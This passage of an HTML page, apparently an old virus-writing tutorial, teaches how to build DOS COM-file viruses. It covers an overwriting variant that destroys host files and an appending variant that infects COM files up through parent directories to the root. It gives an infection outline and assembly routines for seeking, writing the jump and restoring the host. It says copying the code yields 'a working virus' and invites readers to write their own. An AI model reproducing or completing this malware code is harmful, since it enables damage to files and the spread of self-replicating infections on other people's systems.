+;Function:      40h     - Write to File or Device, Using a Handle
+;On entry:      AH      - 40h
+;               BX      - File handle
+;               CX      - Number of bytes to write
+;               DS:DX   - Address of buffer
+;Returns:       AX      - Number of bytes written, or
+;                         Error code, if CF is set
+;Error codes:   5       - Access denied
+;               6       - Invalid handle
+;Network: Requires Write access rights
+;Notes: Data is written starting at the current file pointer.  The file pointer
+;       is  then incremented  by the  number of  bytes written.  If a disk full
+;       condition is encountered, no error code will be returned (i.e., CF will
+;       not  be set);  however,  fewer  bytes  than  requested  will have  been
+;       written.  You should  check for  this condition by  testing for AX less
+;       than CX after returning from the function.
+</PRE><P>
+WARNING: This virus will infect and partially  or totally destroy all COM files
+         in the current directory!
+</P>
+<P> <b>Exiting To DOS</b></P>
+<P>
+In an overwriting virus you need not pass control back to the host, since it is
+partially (or totally) destroyed,  so all the virus needs to do is exit to DOS.
+This can be done in any of this ways:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Return_Control:
+        mov     ah, 4Ch
+        mov     al, 00h
+        int     21h
+
+        ;mov     ah, 00h                ;Here is another way
+        ;int     21h
+
+        ;int     20h                    ;And another
+
+        ;ret                            ;Yet another way
+---------------------------------------------------------------------------8&lt;--
+
+;Interrupt:     21h
+;Function:      4Ch     - Terminate a Process (EXIT)
+;On entry:      AH      - 4Ch
+;               AL      - Return code
+;Returns:       Nothing
+;Notes: This function  is the  proper method  of terminating  a program  in DOS
+;       versions 2.0 and above.  It closes all files, and hands control back to
+;       the parent process  (usually COMMAND.COM),  along with the  return code
+;       specified in AL.
+
+;Interrupt:     21h
+;Function:      00h     - Terminate Program
+;On entry:      AH      - 00h
+;               CS      - Segment address of PSP
+;Returns:       Nothing
+;Notes: DOS terminates the program, flushes the file buffers,  and restores the
+;       terminate, Ctrl-Break,  and critical error exit addresses from the PSP.
+;       Close all files first.
+
+;INT 20h                - Terminate Program
+;On entry:      CS      - Segment address of PSP
+;Returns:       Nothing
+;Notes: Is equivalent to Interrupt 21h, Function 00h.
+
+</PRE>
+<P> <b>An Appending Virus</b></P>
+<P>
+The appending  virus works  by placing  its code at the  end of the host,  then
+copying the first bytes to a safe location and adding a jump to its code at the
+beginning  so that it takes  control before the  host does.  Unlike overwriting
+viruses,  no part of  the host is  permanently destroyed,  so it  will be  much
+harder to notice an infection. It looks like this:
+</P><PRE>
+   +-----------------------------+---------+-------+--------------------------+
+   | JMP to Virus_Start + IDMark | PROGRAM | Virus | First 5 bytes of PROGRAM |
+   +-----------------------------+---------+-------+--------------------------+
+</PRE><P>
+We will worry about  reinfection on this one,  directory preservation  and some
+other things. And here is an outline:
+</P><PRE>
+   1. &lt;Host&gt; (jumps to start of virus)
+   2. Calculate the &lt;Delta_Offset&gt;
+   3. &lt;Save_AX&gt; register
+   4. &lt;Restore_Host&gt;'s 5 original beginning bytes
+   5. &lt;Set_DTA&gt; to a new address
+   6. &lt;Get_Directory&gt; (the current one)
+   7. &lt;Find_First&gt; file
+   8. &lt;Open_File&gt; in read/write mode
+   9. &lt;Read_Five&gt; bytes from beginning of file
+   10. &lt;Check_IDMark&gt; for previous infection
+   11. &lt;Check_Size&gt; of intended host
+   12. &lt;PointTo_Begin&gt; of file
+   13. &lt;Calc_Jump&gt; to main virus body
+   14. &lt;Write_Jump&gt; to host
+   15. &lt;PointTo_End&gt; of file
+   16. &lt;Copy_Body&gt; of virus and the 5 bytes from the beginning of the file
+   17. &lt;Close_File&gt; handle
+   18. &lt;Find_Next&gt; file
+      (a) If another file found then goto step 8
+   19. &lt;ChangeTo_Parent&gt; directory
+      (a) If not already in root then goto step 7
+   20. &lt;Return_Control&gt; (for the appending virus this is just a label)
+   21. &lt;ChangeTo_Root&gt; directory
+   22. &lt;Restore_Directory&gt; to original one
+   23. &lt;Restore_DTA&gt; to PSP:0080h
+   24. &lt;Restore_AX&gt; register
+   25. &lt;ReturnTo_Host&gt; back to the host
+</PRE><P>
+Here is how to restore the host's original 5 bytes:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Restore_Host:
+        mov     cx, 5
+        lea     si, [bp+offset IDMark]
+        mov     di, 100h
+        rep     movsb
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+To move the file pointer to be beginning of the file:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+PointTo_Begin:
+        mov     ah, 42h
+        mov     al, 0
+        mov     bx, word ptr [bp+F_Handle]
+        mov     cx, 0
+        mov     dx, 0
+        int     21h
+        jnc     Calc_Jump
+        jmp     Close_File
+---------------------------------------------------------------------------8&lt;--
+
+;Interrupt:     21h
+;Function:      42h     - Move File Pointer (LSEEK)
+;On entry:      AH      - 42h
+;               BX      - File handle
+;               CX:DX   - Offset, in bytes (signed 32-bit integer)
+;               AL      - Mode code (see below)
+;Mode Code:     AL      - Action
+;               0       - Move pointer CX:DX bytes from beginning of file
+;               1       - Move pointer CX:DX bytes from current location
+;               2       - Move pointer CX:DX bytes from end of file
+;Returns:       DX:AX   - New pointer location (signed 32-bit integer),
+;               or AX   - Error code, if CF is set
+;Error codes:   1       - Invalid mode code
+;               6       - Invalid handle
+</PRE><P>
+And the calculate the new jump according to the host size:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Calc_Jump:
+        mov     ax, word ptr [bp+F_Size]
+        sub     ax, 3
+        mov     word ptr [bp+Jump+1], ax
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+Of course a buffer holding the jump instruction and the marker must exist:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Jump            db      0E9h, 2, 0, 'ID'
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+Then you write to the host the calculated jump to the start of your virus:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Write_Jump:
+        mov     ah, 40h
+        mov     cx, 5
+        lea     dx, [bp+offset Jump]
+        int     21h
+        jnc     In_Between
+        jmp     Close_File
+In_Between:
+        cmp     cx, ax
+        jz      PointTo_End
+        jmp     Close_File
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+After you move the file pointer to the end of the file:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+PointTo_End:
+        mov     ah, 42h
+        mov     al, 2
+        mov     bx, word ptr [bp+F_Handle]
+        mov     cx, 0
+        mov     dx, 0
+        int     21h
+        jnc     Copy_Body
+        jmp     Close_File
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+And to append  the virus to it all you need to do  is use the routine presented
+for the overwriting virus.
+</P><P>
+Also don't forget to first save and then restore the AX register since we'll be
+using it  in the virus  (this will avoid  programs like HotDIR  from failing to
+run):
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Save_AX:
+        push    ax
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+To restore it:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+Restore_AX:
+        pop     ax
+---------------------------------------------------------------------------8&lt;--
+</PRE><P>
+WARNING: Be careful with this virus  since it will infect almost every  'clean'
+         COM file in the current directory and all parent directories up to the
+         root!
+</P>
+<P> <b>Passing Control Back To The Host</b></P>
+<P>
+To restore control back to the host all you need to do is set the IP to 100h:
+</P><PRE>
+--8&lt;---------------------------------------------------------------------------
+ReturnTo_Host:
+        push    100h
+        ret
+
+        ;mov     di, 100h               ; Another way of accomplishing the same
+        ;jmp     di
+---------------------------------------------------------------------------8&lt;--
+</PRE>
+<P> <b>Miscellaneous</b></P>
+<P>
+Don't forget  to place a 'Virus_Start:'  label at the start  of the viral  code
+(for the appending virus  that is right after the ID byte  and right before the
+delta offset calculation routine;  for the overwriting virus it's  right at the
+start of the code,  since there's no need for a dummy host)  and a 'Virus_End:'
+label at the end of the viral code, right after the initialized data and before
+the uninitialized one. Here's out it's supposed to look like:
+</P><PRE>
+Host:                                   ;This part for the appending virus only
+   [Jump to virus code]                 ;"                 "                  "
+   [IDByte]                             ;"                 "                  "
+Virus_Start:
+   [Virus code]
+   ...
+   [Data that needs to be copyed with the code]
+Virus_End:
+   [Uninitialized data that needs not be copyed]
+</PRE><P>
+Change the control flow  instructions according to your virus needs.  Anyway if
+you copy everything as is, you'll end up with a working virus.
+</P>
+<P> <b>.BIN File Structure</b></P>
+<P>
+BIN files are exactly like COM files, they  only have a different extension and
+so must be renamed to be run by DOS.  If you want you can  for example set your
+viruses to infect  BIN files if no COM ones are found in the current directory.
+These type of files are normally created by the EXE2BIN program.
+</P>
+<P> <b>In Closing</b></P>
+<P> Well with this knowledge you can now start writing your own viruses. On next 
+  articles I'll explain some more search and replication routines among some other 
+  things. If there are any next articles that is! </P>
+<hr>
+</BODY>
+</HTML>
